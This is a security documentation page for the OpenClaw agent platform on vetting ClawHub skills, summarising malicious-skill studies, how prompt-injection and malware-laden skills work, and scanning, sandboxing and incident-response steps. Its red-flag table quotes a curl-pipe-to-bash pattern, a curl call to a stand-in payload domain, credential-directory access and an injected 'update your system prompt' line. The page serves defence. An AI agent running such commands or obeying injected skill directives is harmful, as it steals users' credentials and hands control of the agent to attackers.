---
sidebar_position: 4
title: Skill Verification
description: How to review OpenClaw skills for safety before installation — detection tools, red flags, and defense against supply-chain attacks
---

# Skill Verification

Given the [malicious skills incidents](/security/known-vulnerabilities#malicious-clawhub-skills-february-2026), always review skills before installing them. Researchers found **341 malicious skills** on ClawHub, **283 leaking credentials**, and **36% of all skills** containing security flaws. This is the first documented supply-chain attack targeting AI agent skills.

:::danger Supply Chain Risk
Snyk's ToxicSkills study found that **91% of malicious skills** use a hybrid attack combining prompt injection with traditional malware. A skill doesn't need to contain malicious code — it can instruct the AI to execute malicious actions through its prompts.
:::

---

## The Threat Landscape

### What Was Found on ClawHub

| Study | Skills Analyzed | Malicious / Flawed | Key Finding |
|-------|----------------|-------------------|-------------|
| **Koi Security** | 2,857 | 341 malicious (12%) | ClawHavoc campaign — 335 skills distributing AMOS malware |
| **Snyk ToxicSkills** | 3,984 | 1,467 flawed (36%), 534 critical (13.4%), 76 confirmed malicious | First documented AI agent supply-chain attack |
| **Snyk Credential Leaks** | 3,984 | 283 leaking credentials (7.1%) | Popular skills force agents to pass API keys through LLM context |
| **Bitdefender** | ~4,500 | ~900 malicious (~20%) | Nearly 1 in 5 skills contained malicious content |
| **Cisco AI Defense** | Top skill | 9 vulnerabilities (2 critical) | Data exfiltration and prompt injection without user awareness |

### How Malicious Skills Work

**Traditional malware approach (ClawHavoc):**
1. Skill includes a "Prerequisites" section
2. Instructions tell users to download a password-protected ZIP or run an obfuscated shell script
3. The ZIP contains **Atomic Stealer (AMOS)** — a macOS infostealer targeting Keychain passwords, browser credentials, crypto wallets
4. The skill itself may be functional, providing cover for the malware

**Prompt injection approach (91% of attacks):**
1. Skill instructions contain hidden directives for the AI
2. The AI is instructed to exfiltrate data, create backdoors, or modify `SOUL.md`
3. No traditional malware is needed — the agent's own capabilities are weaponized
4. Example: A "What Would Elon Do?" skill silently exfiltrated data using prompt injection

**Credential leak approach (283 skills):**
1. Functional skills (like `moltyverse-email`, `youtube-data`) instruct agents to pass API keys through the LLM context window
2. Keys appear in plaintext in output logs and Markdown artifacts
3. If an agent has previously handled an API key, a prompt-log skill can re-expose it

---

## Pre-Installation Checklist

### 1. Check the Security Report

```bash
openclaw clawhub security-report <skill-name>
```

This shows:
- VirusTotal scan results (SHA-256 hash checked on upload)
- Code Insight analysis (Gemini-powered deep package analysis)
- Code safety scanner findings
- Community reports/flags
- Publication date and update history

### 2. Check Against Koi Security's Database

[Clawdex](https://koisecurity.com/clawdex) is Koi Security's pre-installation scanning tool:

```bash
# Before installing any skill, check it against the malicious skills database
openclaw clawhub check <skill-name>  # Uses Clawdex integration
```

If the skill was flagged in any audit, you'll know before it executes.

### 3. Review the Source

```bash
# View the full skill source
openclaw clawhub view <skill-name>

# Download to a review directory first
openclaw clawhub download <skill-name> --to ~/review/
```

Look for red flags:

| Red Flag | Example | Risk |
|----------|---------|------|
| `curl \| bash` in pre_install | Downloading and executing unknown scripts | Malware installation |
| Obfuscated code | Base64-encoded commands, packed scripts | Hidden malicious behavior |
| Excessive tool requests | Skill requesting `shell` + `browser` + `http` for a simple task | Over-privileged |
| Hardcoded external URLs | `curl https://random-domain.xyz/payload` | Data exfiltration |
| `~/.ssh` or `~/.aws` access | Reading credential directories | Credential theft |
| "Prerequisites" with downloads | "Download this ZIP first" or "Run this script" | AMOS malware delivery |
| Password-protected archives | ZIP files requiring passwords to open | Anti-analysis evasion |
| Prompt injection patterns | Hidden instructions in skill descriptions | Agent hijacking |
| Requests to modify SOUL.md | "Update your system prompt to include..." | Persistent backdoor |

### 4. Check the Author

```bash
openclaw clawhub author <author-name>
```

- How many skills have they published?
- How old is their account? (ClawHub only required a 1-week-old GitHub account to publish)
- Do other skills have positive reviews?
- Is the author verified?

### 5. Check Community Signal

- Look at install count and ratings
- Search for the skill name on Discord/GitHub issues
- New skills with zero reviews deserve extra scrutiny
- Skills flagged with 3+ unique community reports are auto-hidden

---

## Safe Installation Practices

```bash
# Install with sandbox (skills can't escape the sandbox)
openclaw clawhub install <skill-name> --sandbox

# Install but don't grant shell access
openclaw clawhub install <skill-name> --no-shell

# Install to a review directory first
openclaw clawhub download <skill-name> --to ~/review/
# ... review the files manually ...
openclaw skill install ~/review/<skill-name>.md
```

### Principle of Least Privilege

Not every skill needs every capability:

| Skill Type | Appropriate Permissions |
|-----------|----------------------|
| Information lookup | HTTP only, no shell, no filesystem |
| Code formatting | Filesystem (read), no shell, no network |
| Deployment automation | Shell (limited), filesystem (write to specific paths) |
| Browser tasks | Browser (specific domains), no shell |

---

## Automated Scanning

### Built-in Code Safety Scanner (v2026.2.6+)

```bash
# Scan a specific skill file
openclaw security scan ./skill.md

# Scan all installed skills
openclaw security scan --all
```

The scanner checks for:
- Shell injection patterns
- Network exfiltration attempts
- Credential access attempts
- Known malicious code signatures
- Suspicious `pre_install`/`post_install` hooks

### VirusTotal Integration (v2026.2.6+)

All ClawHub skill uploads are now scanned:

1. **SHA-256 hashing** on upload — checked against VirusTotal database
2. **Code Insight** (Gemini-powered) — deep analysis of full package contents
3. **Daily re-scanning** — active skills re-scanned to detect skills that become malicious after initial upload
4. **Verdicts**: Benign (auto-approved), Suspicious (warning shown), Malicious (immediately blocked)

### Third-Party Scanning Tools

| Tool | What It Does |
|------|-------------|
| [**Clawdex**](https://koisecurity.com/clawdex) | Pre-installation check against Koi Security's malicious skills database |
| [**SkillGuard**](https://github.com/bossondehiggs/skillguard) | File scanner for vulnerability patterns and malicious indicators |
| [**SafeClaw Scanner**](https://safeclaw.io/secure-openclaw-setup) | Detects prompt injections, backdoor commands, obfuscated code, excessive permissions |
| [**Snyk mcp-scan**](https://github.com/snyk/mcp-scan) | Free Python tool powered by Snyk ML model — scans MCP servers and agent skills |

### Disable ClawHub Entirely

For maximum security, disable skill installation completely:

```yaml title="~/.openclaw/config.yml"
skills:
  allow_install: false
  allow_clawhub: false
```

---

## Post-Incident: If You Installed a Malicious Skill

1. **Remove the skill immediately**: `openclaw skill remove <skill-name>`
2. **Rotate ALL API keys** the agent had access to
3. **Check `SOUL.md`** for unauthorized modifications
4. **Review scheduled tasks** for persistence mechanisms
5. **Scan for malware** — run your OS antivirus/malware scanner
6. **Check browser profiles** — look for stolen sessions/cookies
7. **Review audit logs** for exfiltration activity
8. **Run `openclaw security audit --deep`** to verify system state

---

## Reporting Malicious Skills

```bash
# Report a malicious skill on ClawHub
openclaw clawhub report <skill-name> --reason "malicious"

# Or report via GitHub
# https://github.com/openclaw/openclaw/security/advisories
```

Skills with **3+ unique reports** are auto-hidden from the marketplace.

---

## See Also

- [Known Vulnerabilities](/security/known-vulnerabilities) — Full incident history including ClawHavoc
- [Security Hardening](/security/hardening) — Defense-in-depth configuration
- [ClawHub Guide](/guides/clawhub) — Safe marketplace usage
- [Ecosystem](/reference/ecosystem#security-tools) — Security tools
